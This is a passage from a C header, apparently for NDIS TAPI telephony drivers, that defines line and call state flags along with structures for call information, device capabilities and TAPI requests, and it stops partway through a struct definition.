#if (NDIS_TAPI_CURRENT_VERSION >= 0x00020000)
#define LINECALLFEATURE_SETTREATMENT      0x20000000
#define LINECALLFEATURE_SETQOS            0x40000000
#define LINECALLFEATURE_SETCALLDATA       0x80000000
#endif

#define LINECALLINFOSTATE_OTHER           0x00000001
#define LINECALLINFOSTATE_DEVSPECIFIC     0x00000002
#define LINECALLINFOSTATE_BEARERMODE      0x00000004
#define LINECALLINFOSTATE_RATE            0x00000008
#define LINECALLINFOSTATE_MEDIAMODE       0x00000010
#define LINECALLINFOSTATE_APPSPECIFIC     0x00000020
#define LINECALLINFOSTATE_CALLID          0x00000040
#define LINECALLINFOSTATE_RELATEDCALLID   0x00000080
#define LINECALLINFOSTATE_ORIGIN          0x00000100
#define LINECALLINFOSTATE_REASON          0x00000200
#define LINECALLINFOSTATE_COMPLETIONID    0x00000400
#define LINECALLINFOSTATE_NUMOWNERINCR    0x00000800
#define LINECALLINFOSTATE_NUMOWNERDECR    0x00001000
#define LINECALLINFOSTATE_NUMMONITORS     0x00002000
#define LINECALLINFOSTATE_TRUNK           0x00004000
#define LINECALLINFOSTATE_CALLERID        0x00008000
#define LINECALLINFOSTATE_CALLEDID        0x00010000
#define LINECALLINFOSTATE_CONNECTEDID     0x00020000
#define LINECALLINFOSTATE_REDIRECTIONID   0x00040000
#define LINECALLINFOSTATE_REDIRECTINGID   0x00080000
#define LINECALLINFOSTATE_DISPLAY         0x00100000
#define LINECALLINFOSTATE_USERUSERINFO    0x00200000
#define LINECALLINFOSTATE_HIGHLEVELCOMP   0x00400000
#define LINECALLINFOSTATE_LOWLEVELCOMP    0x00800000
#define LINECALLINFOSTATE_CHARGINGINFO    0x01000000
#define LINECALLINFOSTATE_TERMINAL        0x02000000
#define LINECALLINFOSTATE_DIALPARAMS      0x04000000
#define LINECALLINFOSTATE_MONITORMODES    0x08000000
#if (NDIS_TAPI_CURRENT_VERSION >= 0x00020000)
#define LINECALLINFOSTATE_TREATMENT       0x10000000
#define LINECALLINFOSTATE_QOS             0x20000000
#define LINECALLINFOSTATE_CALLDATA        0x40000000
#endif

#define LINECALLORIGIN_OUTBOUND           0x00000001
#define LINECALLORIGIN_INTERNAL           0x00000002
#define LINECALLORIGIN_EXTERNAL           0x00000004
#define LINECALLORIGIN_UNKNOWN            0x00000010
#define LINECALLORIGIN_UNAVAIL            0x00000020
#define LINECALLORIGIN_CONFERENCE         0x00000040
#define LINECALLORIGIN_INBOUND            0x00000080

#define LINECALLPARAMFLAGS_SECURE         0x00000001
#define LINECALLPARAMFLAGS_IDLE           0x00000002
#define LINECALLPARAMFLAGS_BLOCKID        0x00000004
#define LINECALLPARAMFLAGS_ORIGOFFHOOK    0x00000008
#define LINECALLPARAMFLAGS_DESTOFFHOOK    0x00000010
#if (NDIS_TAPI_CURRENT_VERSION >= 0x00020000)
#define LINECALLPARAMFLAGS_NOHOLDCONFERENCE \
                                          0x00000020
#define LINECALLPARAMFLAGS_PREDICTIVEDIAL 0x00000040
#define LINECALLPARAMFLAGS_ONESTEPTRANSFER \
                                          0x00000080
#endif

#define LINECALLPARTYID_BLOCKED           0x00000001
#define LINECALLPARTYID_OUTOFAREA         0x00000002
#define LINECALLPARTYID_NAME              0x00000004
#define LINECALLPARTYID_ADDRESS           0x00000008
#define LINECALLPARTYID_PARTIAL           0x00000010
#define LINECALLPARTYID_UNKNOWN           0x00000020
#define LINECALLPARTYID_UNAVAIL           0x00000040

#define LINECALLPRIVILEGE_NONE            0x00000001
#define LINECALLPRIVILEGE_MONITOR         0x00000002
#define LINECALLPRIVILEGE_OWNER           0x00000004

#define LINECALLREASON_DIRECT             0x00000001
#define LINECALLREASON_FWDBUSY            0x00000002
#define LINECALLREASON_FWDNOANSWER        0x00000004
#define LINECALLREASON_FWDUNCOND          0x00000008
#define LINECALLREASON_PICKUP             0x00000010
#define LINECALLREASON_UNPARK             0x00000020
#define LINECALLREASON_REDIRECT           0x00000040
#define LINECALLREASON_CALLCOMPLETION     0x00000080
#define LINECALLREASON_TRANSFER           0x00000100
#define LINECALLREASON_REMINDER           0x00000200
#define LINECALLREASON_UNKNOWN            0x00000400
#define LINECALLREASON_UNAVAIL            0x00000800
#define LINECALLREASON_INTRUDE            0x00001000
#define LINECALLREASON_PARKED             0x00002000
#if (NDIS_TAPI_CURRENT_VERSION >= 0x00020000)
#define LINECALLREASON_CAMPEDON           0x00004000
#define LINECALLREASON_ROUTEREQUEST       0x00008000
#endif

#define LINECALLSELECT_LINE               0x00000001
#define LINECALLSELECT_ADDRESS            0x00000002
#define LINECALLSELECT_CALL               0x00000004
#if (NDIS_TAPI_CURRENT_VERSION > 0x00020000)
#define LINECALLSELECT_DEVICEID           0x00000008
#endif
#if (NDIS_TAPI_CURRENT_VERSION >= 0x00030000)
#define LINECALLSELECT_CALLID             0x00000010
#endif

#define LINECALLSTATE_IDLE                0x00000001
#define LINECALLSTATE_OFFERING            0x00000002
#define LINECALLSTATE_ACCEPTED            0x00000004
#define LINECALLSTATE_DIALTONE            0x00000008
#define LINECALLSTATE_DIALING             0x00000010
#define LINECALLSTATE_RINGBACK            0x00000020
#define LINECALLSTATE_BUSY                0x00000040
#define LINECALLSTATE_SPECIALINFO         0x00000080
#define LINECALLSTATE_CONNECTED           0x00000100
#define LINECALLSTATE_PROCEEDING          0x00000200
#define LINECALLSTATE_ONHOLD              0x00000400
#define LINECALLSTATE_CONFERENCED         0x00000800
#define LINECALLSTATE_ONHOLDPENDCONF      0x00001000
#define LINECALLSTATE_ONHOLDPENDTRANSFER  0x00002000
#define LINECALLSTATE_DISCONNECTED        0x00004000
#define LINECALLSTATE_UNKNOWN             0x00008000

#define LINEDEVCAPFLAGS_CROSSADDRCONF     0x00000001
#define LINEDEVCAPFLAGS_HIGHLEVCOMP       0x00000002
#define LINEDEVCAPFLAGS_LOWLEVCOMP        0x00000004
#define LINEDEVCAPFLAGS_MEDIACONTROL      0x00000008
#define LINEDEVCAPFLAGS_MULTIPLEADDR      0x00000010
#define LINEDEVCAPFLAGS_CLOSEDROP         0x00000020
#define LINEDEVCAPFLAGS_DIALBILLING       0x00000040
#define LINEDEVCAPFLAGS_DIALQUIET         0x00000080
#define LINEDEVCAPFLAGS_DIALDIALTONE      0x00000100
#if (NDIS_TAPI_CURRENT_VERSION >= 0x00030000)
#define LINEDEVCAPFLAGS_MSP               0x00000200
#define LINEDEVCAPFLAGS_CALLHUB           0x00000400
#define LINEDEVCAPFLAGS_CALLHUBTRACKING   0x00000800
#define LINEDEVCAPFLAGS_PRIVATEOBJECTS    0x00001000
#endif

#define LINEDEVSTATE_OTHER      0x00000001
#define LINEDEVSTATE_RINGING              0x00000002
#define LINEDEVSTATE_CONNECTED            0x00000004
#define LINEDEVSTATE_DISCONNECTED         0x00000008
#define LINEDEVSTATE_MSGWAITON            0x00000010
#define LINEDEVSTATE_MSGWAITOFF           0x00000020
#define LINEDEVSTATE_INSERVICE            0x00000040
#define LINEDEVSTATE_OUTOFSERVICE         0x00000080
#define LINEDEVSTATE_MAINTENANCE          0x00000100
#define LINEDEVSTATE_OPEN                 0x00000200
#define LINEDEVSTATE_CLOSE                0x00000400
#define LINEDEVSTATE_NUMCALLS             0x00000800
#define LINEDEVSTATE_NUMCOMPLETIONS       0x00001000
#define LINEDEVSTATE_TERMINALS            0x00002000
#define LINEDEVSTATE_ROAMMODE             0x00004000
#define LINEDEVSTATE_BATTERY              0x00008000
#define LINEDEVSTATE_SIGNAL               0x00010000
#define LINEDEVSTATE_DEVSPECIFIC          0x00020000
#define LINEDEVSTATE_REINIT               0x00040000
#define LINEDEVSTATE_LOCK                 0x00080000

#define LINEDEVSTATUSFLAGS_CONNECTED      0x00000001
#define LINEDEVSTATUSFLAGS_MSGWAIT        0x00000002
#define LINEDEVSTATUSFLAGS_INSERVICE      0x00000004
#define LINEDEVSTATUSFLAGS_LOCKED         0x00000008

#define LINEDIALTONEMODE_NORMAL           0x00000001
#define LINEDIALTONEMODE_SPECIAL          0x00000002
#define LINEDIALTONEMODE_INTERNAL         0x00000004
#define LINEDIALTONEMODE_EXTERNAL         0x00000008
#define LINEDIALTONEMODE_UNKNOWN          0x00000010
#define LINEDIALTONEMODE_UNAVAIL          0x00000020

#define LINEDIGITMODE_PULSE               0x00000001
#define LINEDIGITMODE_DTMF                0x00000002
#define LINEDIGITMODE_DTMFEND             0x00000004

#define LINEDISCONNECTMODE_NORMAL         0x00000001
#define LINEDISCONNECTMODE_UNKNOWN        0x00000002
#define LINEDISCONNECTMODE_REJECT         0x00000004
#define LINEDISCONNECTMODE_PICKUP         0x00000008
#define LINEDISCONNECTMODE_FORWARDED      0x00000010
#define LINEDISCONNECTMODE_BUSY           0x00000020
#define LINEDISCONNECTMODE_NOANSWER       0x00000040
#define LINEDISCONNECTMODE_BADADDRESS     0x00000080
#define LINEDISCONNECTMODE_UNREACHABLE    0x00000100
#define LINEDISCONNECTMODE_CONGESTION     0x00000200
#define LINEDISCONNECTMODE_INCOMPATIBLE   0x00000400
#define LINEDISCONNECTMODE_UNAVAIL        0x00000800
#define LINEDISCONNECTMODE_NODIALTONE     0x00001000
#if (NDIS_TAPI_CURRENT_VERSION >= 0x00020000)
#define LINEDISCONNECTMODE_NUMBERCHANGED  0x00002000
#define LINEDISCONNECTMODE_OUTOFORDER     0x00004000
#define LINEDISCONNECTMODE_TEMPFAILURE    0x00008000
#define LINEDISCONNECTMODE_QOSUNAVAIL     0x00010000
#define LINEDISCONNECTMODE_BLOCKED        0x00020000
#define LINEDISCONNECTMODE_DONOTDISTURB   0x00040000
#define LINEDISCONNECTMODE_CANCELLED      0x00080000
#endif

#define LINEFEATURE_DEVSPECIFIC           0x00000001
#define LINEFEATURE_DEVSPECIFICFEAT       0x00000002
#define LINEFEATURE_FORWARD               0x00000004
#define LINEFEATURE_MAKECALL              0x00000008
#define LINEFEATURE_SETMEDIACONTROL       0x00000010
#define LINEFEATURE_SETTERMINAL           0x00000020
#if (NDIS_TAPI_CURRENT_VERSION >= 0x00020000)
#define LINEFEATURE_SETDEVSTATUS          0x00000040
#define LINEFEATURE_FORWARDFWD            0x00000080
#define LINEFEATURE_FORWARDDND            0x00000100
#endif

#define LINEFORWARDMODE_UNCOND            0x00000001
#define LINEFORWARDMODE_UNCONDINTERNAL    0x00000002
#define LINEFORWARDMODE_UNCONDEXTERNAL    0x00000004
#define LINEFORWARDMODE_UNCONDSPECIFIC    0x00000008
#define LINEFORWARDMODE_BUSY              0x00000010
#define LINEFORWARDMODE_BUSYINTERNAL      0x00000020
#define LINEFORWARDMODE_BUSYEXTERNAL      0x00000040
#define LINEFORWARDMODE_BUSYSPECIFIC      0x00000080
#define LINEFORWARDMODE_NOANSW            0x00000100
#define LINEFORWARDMODE_NOANSWINTERNAL    0x00000200
#define LINEFORWARDMODE_NOANSWEXTERNAL    0x00000400
#define LINEFORWARDMODE_NOANSWSPECIFIC    0x00000800
#define LINEFORWARDMODE_BUSYNA            0x00001000
#define LINEFORWARDMODE_BUSYNAINTERNAL    0x00002000
#define LINEFORWARDMODE_BUSYNAEXTERNAL    0x00004000
#define LINEFORWARDMODE_BUSYNASPECIFIC    0x00008000

#define LINEGATHERTERM_BUFFERFULL         0x00000001
#define LINEGATHERTERM_TERMDIGIT          0x00000002
#define LINEGATHERTERM_FIRSTTIMEOUT       0x00000004
#define LINEGATHERTERM_INTERTIMEOUT       0x00000008
#define LINEGATHERTERM_CANCEL             0x00000010

#define LINEGENERATETERM_DONE             0x00000001
#define LINEGENERATETERM_CANCEL           0x00000002

#define LINEMEDIACONTROL_NONE             0x00000001
#define LINEMEDIACONTROL_START            0x00000002
#define LINEMEDIACONTROL_RESET            0x00000004
#define LINEMEDIACONTROL_PAUSE            0x00000008
#define LINEMEDIACONTROL_RESUME           0x00000010
#define LINEMEDIACONTROL_RATEUP           0x00000020
#define LINEMEDIACONTROL_RATEDOWN         0x00000040
#define LINEMEDIACONTROL_RATENORMAL       0x00000080
#define LINEMEDIACONTROL_VOLUMEUP         0x00000100
#define LINEMEDIACONTROL_VOLUMEDOWN       0x00000200
#define LINEMEDIACONTROL_VOLUMENORMAL     0x00000400

#define LINEMEDIAMODE_UNKNOWN             0x00000002
#define LINEMEDIAMODE_INTERACTIVEVOICE    0x00000004
#define LINEMEDIAMODE_AUTOMATEDVOICE      0x00000008
#define LINEMEDIAMODE_DATAMODEM           0x00000010
#define LINEMEDIAMODE_G3FAX               0x00000020
#define LINEMEDIAMODE_TDD                 0x00000040
#define LINEMEDIAMODE_G4FAX               0x00000080
#define LINEMEDIAMODE_DIGITALDATA         0x00000100
#define LINEMEDIAMODE_TELETEX             0x00000200
#define LINEMEDIAMODE_VIDEOTEX            0x00000400
#define LINEMEDIAMODE_TELEX               0x00000800
#define LINEMEDIAMODE_MIXED               0x00001000
#define LINEMEDIAMODE_ADSI                0x00002000

#define LINEMEDIAMODE_VOICEVIEW           0x00004000
#define LAST_LINEMEDIAMODE                0x00004000
#if (NDIS_TAPI_CURRENT_VERSION >= 0x00020001)
#define LINEMEDIAMODE_VIDEO               0x00008000
#define LAST_LINEMEDIAMODE                0x00008000
#endif

#define LINEPARKMODE_DIRECTED             0x00000001
#define LINEPARKMODE_NONDIRECTED          0x00000002

#define LINEREMOVEFROMCONF_NONE           0x00000001
#define LINEREMOVEFROMCONF_LAST           0x00000002
#define LINEREMOVEFROMCONF_ANY            0x00000003

#define LINEREQUESTMODE_MAKECALL          0x00000001
#define LINEREQUESTMODE_MEDIACALL         0x00000002
#define LINEREQUESTMODE_DROP              0x00000004

#define LAST_LINEREQUESTMODE              LINEREQUESTMODE_MEDIACALL

#define LINEROAMMODE_UNKNOWN              0x00000001
#define LINEROAMMODE_UNAVAIL              0x00000002
#define LINEROAMMODE_HOME                 0x00000004
#define LINEROAMMODE_ROAMA                0x00000008
#define LINEROAMMODE_ROAMB                0x00000010

#define LINESPECIALINFO_NOCIRCUIT         0x00000001
#define LINESPECIALINFO_CUSTIRREG         0x00000002
#define LINESPECIALINFO_REORDER           0x00000004
#define LINESPECIALINFO_UNKNOWN           0x00000008
#define LINESPECIALINFO_UNAVAIL           0x00000010

#define LINETERMDEV_PHONE                 0x00000001
#define LINETERMDEV_HEADSET               0x00000002
#define LINETERMDEV_SPEAKER               0x00000004

#define LINETERMMODE_BUTTONS              0x00000001
#define LINETERMMODE_LAMPS                0x00000002
#define LINETERMMODE_DISPLAY              0x00000004
#define LINETERMMODE_RINGER               0x00000008
#define LINETERMMODE_HOOKSWITCH           0x00000010
#define LINETERMMODE_MEDIATOLINE          0x00000020
#define LINETERMMODE_MEDIAFROMLINE        0x00000040
#define LINETERMMODE_MEDIABIDIRECT        0x00000080

#define LINETERMSHARING_PRIVATE           0x00000001
#define LINETERMSHARING_SHAREDEXCL        0x00000002
#define LINETERMSHARING_SHAREDCONF        0x00000004

#define LINETONEMODE_CUSTOM               0x00000001
#define LINETONEMODE_RINGBACK             0x00000002
#define LINETONEMODE_BUSY                 0x00000004
#define LINETONEMODE_BEEP                 0x00000008
#define LINETONEMODE_BILLING              0x00000010

#define LINETRANSFERMODE_TRANSFER         0x00000001
#define LINETRANSFERMODE_CONFERENCE       0x00000002

#define LINETOLLLISTOPTION_ADD            0x00000001
#define LINETOLLLISTOPTION_REMOVE         0x00000002

#define LINETRANSLATEOPTION_CARDOVERRIDE  0x00000001

#define LINETRANSLATERESULT_CANONICAL     0x00000001
#define LINETRANSLATERESULT_INTERNATIONAL 0x00000002
#define LINETRANSLATERESULT_LONGDISTANCE  0x00000004
#define LINETRANSLATERESULT_LOCAL         0x00000008
#define LINETRANSLATERESULT_INTOLLLIST    0x00000010
#define LINETRANSLATERESULT_NOTINTOLLLIST 0x00000020
#define LINETRANSLATERESULT_DIALBILLING   0x00000040
#define LINETRANSLATERESULT_DIALQUIET     0x00000080
#define LINETRANSLATERESULT_DIALDIALTONE  0x00000100
#define LINETRANSLATERESULT_DIALPROMPT    0x00000200
#if (NDIS_TAPI_CURRENT_VERSION >= 0x00020000)
#define LINETRANSLATERESULT_VOICEDETECT   0x00000400
#endif

#if (NDIS_TAPI_CURRENT_VERSION >= 0x00030000)
#define LINETRANSLATERESULT_NOTRANSLATION 0x00000800
#endif


typedef struct  _NDIS_VAR_DATA_DESC {
	USHORT  Length;
	USHORT  MaximumLength;
	LONG  Offset;
} NDIS_VAR_DATA_DESC, *PNDIS_VAR_DATA_DESC;

typedef struct _LINE_DIAL_PARAMS {
	ULONG  ulDialPause;
	ULONG  ulDialSpeed;
	ULONG  ulDigitDuration;
	ULONG  ulWaitForDialtone;
} LINE_DIAL_PARAMS, *PLINE_DIAL_PARAMS;

typedef struct _LINE_ADDRESS_CAPS {
	ULONG  ulTotalSize;
	ULONG  ulNeededSize;
	ULONG  ulUsedSize;
	ULONG  ulLineDeviceID;
	ULONG  ulAddressSize;
	ULONG  ulAddressOffset;
	ULONG  ulDevSpecificSize;
	ULONG  ulDevSpecificOffset;
	ULONG  ulAddressSharing;
	ULONG  ulAddressStates;
	ULONG  ulCallInfoStates;
	ULONG  ulCallerIDFlags;
	ULONG  ulCalledIDFlags;
	ULONG  ulConnectedIDFlags;
	ULONG  ulRedirectionIDFlags;
	ULONG  ulRedirectingIDFlags;
	ULONG  ulCallStates;
	ULONG  ulDialToneModes;
	ULONG  ulBusyModes;
	ULONG  ulSpecialInfo;
	ULONG  ulDisconnectModes;
	ULONG  ulMaxNumActiveCalls;
	ULONG  ulMaxNumOnHoldCalls;
	ULONG  ulMaxNumOnHoldPendingCalls;
	ULONG  ulMaxNumConference;
	ULONG  ulMaxNumTransConf;
	ULONG  ulAddrCapFlags;
	ULONG  ulCallFeatures;
	ULONG  ulRemoveFromConfCaps;
	ULONG  ulRemoveFromConfState;
	ULONG  ulTransferModes;
	ULONG  ulParkModes;
	ULONG  ulForwardModes;
	ULONG  ulMaxForwardEntries;
	ULONG  ulMaxSpecificEntries;
	ULONG  ulMinFwdNumRings;
	ULONG  ulMaxFwdNumRings;
	ULONG  ulMaxCallCompletions;
	ULONG  ulCallCompletionConds;
	ULONG  ulCallCompletionModes;
	ULONG  ulNumCompletionMessages;
	ULONG  ulCompletionMsgTextEntrySize;
	ULONG  ulCompletionMsgTextSize;
	ULONG  ulCompletionMsgTextOffset;
#if (NDIS_TAPI_CURRENT_VERSION >= 0x00010004)
	ULONG  ulAddressFeatures;
#if (NDIS_TAPI_CURRENT_VERSION >= 0x00020000)
	ULONG  ulPredictiveAutoTransferStates;
	ULONG  ulNumCallTreatments;
	ULONG  ulCallTreatmentListSize;
	ULONG  ulCallTreatmentListOffset;
	ULONG  ulDeviceClassesSize;
	ULONG  ulDeviceClassesOffset;
	ULONG  ulMaxCallDataSize;
	ULONG  ulCallFeatures2;
	ULONG  ulMaxNoAnswerTimeout;
	ULONG  ulConnectedModes;
	ULONG  ulOfferingModes;
	ULONG  ulAvailableMediaModes;
#endif
#endif
} LINE_ADDRESS_CAPS, *PLINE_ADDRESS_CAPS;

typedef struct _LINE_ADDRESS_STATUS {
	ULONG  ulTotalSize;
	ULONG  ulNeededSize;
	ULONG  ulUsedSize;
	ULONG  ulNumInUse;
	ULONG  ulNumActiveCalls;
	ULONG  ulNumOnHoldCalls;
	ULONG  ulNumOnHoldPendCalls;
	ULONG  ulAddressFeatures;
	ULONG  ulNumRingsNoAnswer;
	ULONG  ulForwardNumEntries;
	ULONG  ulForwardSize;
	ULONG  ulForwardOffset;
	ULONG  ulTerminalModesSize;
	ULONG  ulTerminalModesOffset;
	ULONG  ulDevSpecificSize;
	ULONG  ulDevSpecificOffset;
} LINE_ADDRESS_STATUS, *PLINE_ADDRESS_STATUS;

typedef struct _LINE_CALL_INFO {
	ULONG  ulTotalSize;
	ULONG  ulNeededSize;
	ULONG  ulUsedSize;
	ULONG  hLine;
	ULONG  ulLineDeviceID;
	ULONG  ulAddressID;
	ULONG  ulBearerMode;
	ULONG  ulRate;
	ULONG  ulMediaMode;
	ULONG  ulAppSpecific;
	ULONG  ulCallID;
	ULONG  ulRelatedCallID;
	ULONG  ulCallParamFlags;
	ULONG  ulCallStates;
	ULONG  ulMonitorDigitModes;
	ULONG  ulMonitorMediaModes;
	LINE_DIAL_PARAMS  DialParams;
	ULONG  ulOrigin;
	ULONG  ulReason;
	ULONG  ulCompletionID;
	ULONG  ulNumOwners;
	ULONG  ulNumMonitors;
	ULONG  ulCountryCode;
	ULONG  ulTrunk;
	ULONG  ulCallerIDFlags;
	ULONG  ulCallerIDSize;
	ULONG  ulCallerIDOffset;
	ULONG  ulCallerIDNameSize;
	ULONG  ulCallerIDNameOffset;
	ULONG  ulCalledIDFlags;
	ULONG  ulCalledIDSize;
	ULONG  ulCalledIDOffset;
	ULONG  ulCalledIDNameSize;
	ULONG  ulCalledIDNameOffset;
	ULONG  ulConnectedIDFlags;
	ULONG  ulConnectedIDSize;
	ULONG  ulConnectedIDOffset;
	ULONG  ulConnectedIDNameSize;
	ULONG  ulConnectedIDNameOffset;
	ULONG  ulRedirectionIDFlags;
	ULONG  ulRedirectionIDSize;
	ULONG  ulRedirectionIDOffset;
	ULONG  ulRedirectionIDNameSize;
	ULONG  ulRedirectionIDNameOffset;
	ULONG  ulRedirectingIDFlags;
	ULONG  ulRedirectingIDSize;
	ULONG  ulRedirectingIDOffset;
	ULONG  ulRedirectingIDNameSize;
	ULONG  ulRedirectingIDNameOffset;
	ULONG  ulAppNameSize;
	ULONG  ulAppNameOffset;
	ULONG  ulDisplayableAddressSize;
	ULONG  ulDisplayableAddressOffset;
	ULONG  ulCalledPartySize;
	ULONG  ulCalledPartyOffset;
	ULONG  ulCommentSize;
	ULONG  ulCommentOffset;
	ULONG  ulDisplaySize;
	ULONG  ulDisplayOffset;
	ULONG  ulUserUserInfoSize;
	ULONG  ulUserUserInfoOffset;
	ULONG  ulHighLevelCompSize;
	ULONG  ulHighLevelCompOffset;
	ULONG  ulLowLevelCompSize;
	ULONG  ulLowLevelCompOffset;
	ULONG  ulChargingInfoSize;
	ULONG  ulChargingInfoOffset;
	ULONG  ulTerminalModesSize;
	ULONG  ulTerminalModesOffset;
	ULONG  ulDevSpecificSize;
	ULONG  ulDevSpecificOffset;
#if (NDIS_TAPI_CURRENT_VERSION >= 0x00020000)
	ULONG  ulCallTreatment;
	ULONG  ulCallDataSize;
	ULONG  ulCallDataOffset;
	ULONG  ulSendingFlowspecSize;
	ULONG  ulSendingFlowspecOffset;
	ULONG  ulReceivingFlowspecSize;
	ULONG  ulReceivingFlowspecOffset;
#endif
#if (NDIS_TAPI_CURRENT_VERSION >= 0x00030000)
	ULONG  ulCallerIDAddressType;
	ULONG  ulCalledIDAddressType;
	ULONG  ulConnectedIDAddressType;
	ULONG  ulRedirectionIDAddressType;
	ULONG  ulRedirectingIDAddressType;
#endif
} LINE_CALL_INFO, *PLINE_CALL_INFO;

typedef struct _LINE_CALL_PARAMS {
  ULONG  ulTotalSize;
	ULONG  ulBearerMode;
	ULONG  ulMinRate;
	ULONG  ulMaxRate;
	ULONG  ulMediaMode;
	ULONG  ulCallParamFlags;
	ULONG  ulAddressMode;
	ULONG  ulAddressID;
	LINE_DIAL_PARAMS  DialParams;
	ULONG  ulOrigAddressSize;
	ULONG  ulOrigAddressOffset;
	ULONG  ulDisplayableAddressSize;
	ULONG  ulDisplayableAddressOffset;
	ULONG  ulCalledPartySize;
	ULONG  ulCalledPartyOffset;
	ULONG  ulCommentSize;
	ULONG  ulCommentOffset;
	ULONG  ulUserUserInfoSize;
	ULONG  ulUserUserInfoOffset;
	ULONG  ulHighLevelCompSize;
	ULONG  ulHighLevelCompOffset;
	ULONG  ulLowLevelCompSize;
	ULONG  ulLowLevelCompOffset;
	ULONG  ulDevSpecificSize;
	ULONG  ulDevSpecificOffset;
#if (NDIS_TAPI_CURRENT_VERSION >= 0x00020000)
	ULONG  ulPredictiveAutoTransferStates;
	ULONG  ulTargetAddressSize;
	ULONG  ulTargetAddressOffset;
	ULONG  ulSendingFlowspecSize;
	ULONG  ulSendingFlowspecOffset;
	ULONG  ulReceivingFlowspecSize;
	ULONG  ulReceivingFlowspecOffset;
	ULONG  ulDeviceClassSize;
	ULONG  ulDeviceClassOffset;
	ULONG  ulDeviceConfigSize;
	ULONG  ulDeviceConfigOffset;
	ULONG  ulCallDataSize;
	ULONG  ulCallDataOffset;
	ULONG  ulNoAnswerTimeout;
	ULONG  ulCallingPartyIDSize;
	ULONG  ulCallingPartyIDOffset;
#endif
#if (NDIS_TAPI_CURRENT_VERSION >= 0x00030000)
  ULONG  ulAddressType;
#endif
} LINE_CALL_PARAMS, *PLINE_CALL_PARAMS;

typedef struct _LINE_CALL_STATUS {
	ULONG  ulTotalSize;
	ULONG  ulNeededSize;
	ULONG  ulUsedSize;
	ULONG  ulCallState;
	ULONG  ulCallStateMode;
	ULONG  ulCallPrivilege;
	ULONG  ulCallFeatures;
	ULONG  ulDevSpecificSize;
	ULONG  ulDevSpecificOffset;
} LINE_CALL_STATUS, *PLINE_CALL_STATUS;

typedef struct _LINE_DEV_CAPS {
	ULONG  ulTotalSize;
	ULONG  ulNeededSize;
	ULONG  ulUsedSize;
	ULONG  ulProviderInfoSize;
	ULONG  ulProviderInfoOffset;
	ULONG  ulSwitchInfoSize;
	ULONG  ulSwitchInfoOffset;
	ULONG  ulPermanentLineID;
	ULONG  ulLineNameSize;
	ULONG  ulLineNameOffset;
	ULONG  ulStringFormat;
	ULONG  ulAddressModes;
	ULONG  ulNumAddresses;
	ULONG  ulBearerModes;
	ULONG  ulMaxRate;
	ULONG  ulMediaModes;
	ULONG  ulGenerateToneModes;
	ULONG  ulGenerateToneMaxNumFreq;
	ULONG  ulGenerateDigitModes;
	ULONG  ulMonitorToneMaxNumFreq;
	ULONG  ulMonitorToneMaxNumEntries;
	ULONG  ulMonitorDigitModes;
	ULONG  ulGatherDigitsMinTimeout;
	ULONG  ulGatherDigitsMaxTimeout;
	ULONG  ulMedCtlDigitMaxListSize;
	ULONG  ulMedCtlMediaMaxListSize;
	ULONG  ulMedCtlToneMaxListSize;
	ULONG  ulMedCtlCallStateMaxListSize;
	ULONG  ulDevCapFlags;
	ULONG  ulMaxNumActiveCalls;
	ULONG  ulAnswerMode;
	ULONG  ulRingModes;
	ULONG  ulLineStates;
	ULONG  ulUUIAcceptSize;
	ULONG  ulUUIAnswerSize;
	ULONG  ulUUIMakeCallSize;
	ULONG  ulUUIDropSize;
	ULONG  ulUUISendUserUserInfoSize;
	ULONG  ulUUICallInfoSize;
	LINE_DIAL_PARAMS  MinDialParams;
	LINE_DIAL_PARAMS  MaxDialParams;
	LINE_DIAL_PARAMS  DefaultDialParams;
	ULONG  ulNumTerminals;
	ULONG  ulTerminalCapsSize;
	ULONG  ulTerminalCapsOffset;
	ULONG  ulTerminalTextEntrySize;
	ULONG  ulTerminalTextSize;
	ULONG  ulTerminalTextOffset;
	ULONG  ulDevSpecificSize;
	ULONG  ulDevSpecificOffset;
#if (NDIS_TAPI_CURRENT_VERSION >= 0x00010004)
	ULONG  ulLineFeatures;
#endif
#if (NDIS_TAPI_CURRENT_VERSION >= 0x00020000)
	ULONG  ulSettableDevStatus;
	ULONG  ulDeviceClassesSize;
	ULONG  ulDeviceClassesOffset;
#endif
#if (NDIS_TAPI_CURRENT_VERSION >= 0x00020002)
  GUID  PermanentLineGuid;
#endif
#if (NDIS_TAPI_CURRENT_VERSION >= 0x00030000)
	ULONG  ulAddressTypes;
	GUID  ProtocolGuid;
	ULONG  ulAvailableTracking;
#endif
} LINE_DEV_CAPS, *PLINE_DEV_CAPS;

typedef struct _LINE_DEV_STATUS {
	ULONG  ulTotalSize;
	ULONG  ulNeededSize;
	ULONG  ulUsedSize;
	ULONG  ulNumOpens;
	ULONG  ulOpenMediaModes;
	ULONG  ulNumActiveCalls;
	ULONG  ulNumOnHoldCalls;
	ULONG  ulNumOnHoldPendCalls;
	ULONG  ulLineFeatures;
	ULONG  ulNumCallCompletions;
	ULONG  ulRingMode;
	ULONG  ulSignalLevel;
	ULONG  ulBatteryLevel;
	ULONG  ulRoamMode;
	ULONG  ulDevStatusFlags;
	ULONG  ulTerminalModesSize;
	ULONG  ulTerminalModesOffset;
	ULONG  ulDevSpecificSize;
	ULONG  ulDevSpecificOffset;
} LINE_DEV_STATUS, *PLINE_DEV_STATUS;

typedef struct _LINE_EXTENSION_ID {
	ULONG  ulExtensionID0;
	ULONG  ulExtensionID1;
	ULONG  ulExtensionID2;
	ULONG  ulExtensionID3;
} LINE_EXTENSION_ID, *PLINE_EXTENSION_ID;

typedef struct _VAR_STRING {
	ULONG  ulTotalSize;
	ULONG  ulNeededSize;
	ULONG  ulUsedSize;
	ULONG  ulStringFormat;
	ULONG  ulStringSize;
	ULONG  ulStringOffset;
} VAR_STRING, *PVAR_STRING;

typedef struct _NDIS_TAPI_ANSWER {
  IN ULONG  ulRequestID;
  IN HDRV_CALL  hdCall;
  IN ULONG  ulUserUserInfoSize;
  IN UCHAR  UserUserInfo[1];
} NDIS_TAPI_ANSWER, *PNDIS_TAPI_ANSWER;

typedef struct _NDIS_TAPI_CLOSE {
  IN ULONG  ulRequestID;
  IN HDRV_LINE  hdLine;
} NDIS_TAPI_CLOSE, *PNDIS_TAPI_CLOSE;

typedef struct _NDIS_TAPI_CLOSE_CALL {
  IN ULONG  ulRequestID;
  IN HDRV_CALL  hdCall;
} NDIS_TAPI_CLOSE_CALL, *PNDIS_TAPI_CLOSE_CALL;

typedef struct _NDIS_TAPI_CONDITIONAL_MEDIA_DETECTION {
  IN ULONG  ulRequestID;
  IN HDRV_LINE  hdLine;
  IN ULONG  ulMediaModes;
  IN LINE_CALL_PARAMS  LineCallParams;
